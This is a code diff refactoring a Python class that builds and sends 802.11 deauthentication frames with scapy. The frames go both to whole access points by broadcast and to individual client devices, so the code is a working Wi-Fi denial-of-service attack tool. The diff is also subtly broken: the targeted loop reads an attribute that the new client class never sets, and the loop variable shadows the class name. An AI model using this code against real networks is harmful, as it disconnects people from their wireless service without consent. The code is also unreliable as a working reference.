@@ -12,6 +12,19 @@ from utils.utils import DEVNULL
 from utils.networkmanager import NetworkCard
 from textwrap import dedent
 
+class BSSID(object):
+    def __init__(self, id, bssid):
+        self.id = id
+        self.bssid = bssid
+        self.ssid = None
+
+class DeauthClient(object):
+    def __init__(self, id, client_mac, ap_bssid):
+        self.id = id
+        self.client_mac = client_mac
+        self.ap_bssid = ap_bssid
+        self.ap_ssid = None
+
 class AirDeauthenticator(object):
 
     def __init__(self, targeted_only=False, burst_count=5):
@@ -23,17 +36,13 @@ class AirDeauthenticator(object):
         self._targeted_only = targeted_only     # Flag if we only want to perform targeted deauthentication attacks
         self._burst_count = burst_count         # Number of sequential deuathentication packet bursts to send
         self.bssids_to_deauth = []              # MAC addresses of APs, used to send deauthentication packets to broadcast
-        self.clients_to_deauth = {}             # Pairs clients to their connected AP to send targeted deauthentication attacks
+        self.clients_to_deauth = []             # Pairs clients to their connected AP to send targeted deauthentication attacks
 
     def add_bssid(self, bssid):
-        self.bssids_to_deauth.append(bssid)
+        self.bssids_to_deauth.append(BSSID(len(self.bssids_to_deauth), bssid))
 
     def add_client(self, client_mac, bssid):
-        try:
-            self.clients_to_deauth[client_mac]  # Throws KeyError if not existent
-            self.clients_to_deauth[client_mac].append(bssid)
-        except KeyError:
-            self.clients_to_deauth[client_mac] = [bssid]
+        self.clients_to_deauth.append(DeauthClient(len(self.clients_to_deauth), client_mac, bssid))
 
     def set_burst_count(self, count):
         self._burst_count = count
@@ -48,25 +57,25 @@ class AirDeauthenticator(object):
         packets = []
 
         if not self._targeted_only:
-            for bssid in self.bssids_to_deauth:
+            for BSSID in self.bssids_to_deauth:
                 deauth_packet = RadioTap() / \
-                                Dot11(type=0,subtype=12, addr1="FF:FF:FF:FF:FF:FF", addr2=bssid, addr3=bssid) / \
+                                Dot11(type=0,subtype=12, addr1="FF:FF:FF:FF:FF:FF", addr2=BSSID.bssid, addr3=BSSID.bssid) / \
                                 Dot11Deauth(reason=7)
 
                 packets.append(deauth_packet)
 
-        for client in self.clients_to_deauth.keys():
-            bssids = self.clients_to_deauth[client]
-            for bssid in bssids:
-                deauth_packet1 =    RadioTap() / \
-                                    Dot11(type=0,subtype=12, addr1=bssid, addr2=client, addr3=client) / \
-                                    Dot11Deauth(reason=7)
-                deauth_packet2 =    RadioTap() / \
-                                    Dot11(type=0,subtype=12, addr1=client, addr2=bssid, addr3=bssid) / \
-                                    Dot11Deauth(reason=7)
+        for client in self.clients_to_deauth:
+            mac = client.client_mac
+            bssid = client.bssid
+            deauth_packet1 =    RadioTap() / \
+                                Dot11(type=0,subtype=12, addr1=bssid, addr2=mac, addr3=mac) / \
+                                Dot11Deauth(reason=7)
+            deauth_packet2 =    RadioTap() / \
+                                Dot11(type=0,subtype=12, addr1=mac, addr2=bssid, addr3=bssid) / \
+                                Dot11Deauth(reason=7)
 
-                packets.append(deauth_packet1)
-                packets.append(deauth_packet2)
+            packets.append(deauth_packet1)
+            packets.append(deauth_packet2)
 
         count = self._burst_count if self._burst_count > 0 else 5
 
